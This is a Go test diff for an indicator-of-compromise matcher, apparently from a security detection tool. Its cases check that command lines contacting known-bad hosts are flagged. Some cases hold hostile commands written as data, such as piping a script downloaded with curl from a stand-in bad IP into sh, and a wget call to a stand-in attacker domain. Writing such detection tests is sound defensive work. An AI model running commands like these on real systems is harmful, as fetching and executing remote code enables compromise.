@@ -78,3 +78,23 @@ func TestEngineMatchIOCUsesCommandLineURL(t *testing.T) {
 		t.Error("process with a known-bad URL should match")
 	}
 }
+
+func TestMatchHostsInText(t *testing.T) {
+	ip := map[string]store.IOCIndicator{"203.0.113.7": {Value: "203.0.113.7", IOCType: "ip"}}
+	dom := map[string]store.IOCIndicator{"evil.test": {Value: "evil.test", IOCType: "domain"}, "github.com": {Value: "github.com", IOCType: "domain"}}
+	for _, c := range []struct {
+		text string
+		want bool
+	}{
+		{"curl -s http://203.0.113.7/x.sh | sh", true},
+		{"wget https://evil.test/a", true},
+		{"wget https://cdn.sub.evil.test/a", true},
+		{"curl https://github.com/org/repo", false}, // shared host never matches
+		{"curl https://example.com/", false},
+		{"echo evil.test", false}, // no URL, not a connection
+	} {
+		if got := matchHostsInText(c.text, ip, dom) != nil; got != c.want {
+			t.Errorf("%q: got %v want %v", c.text, got, c.want)
+		}
+	}
+}
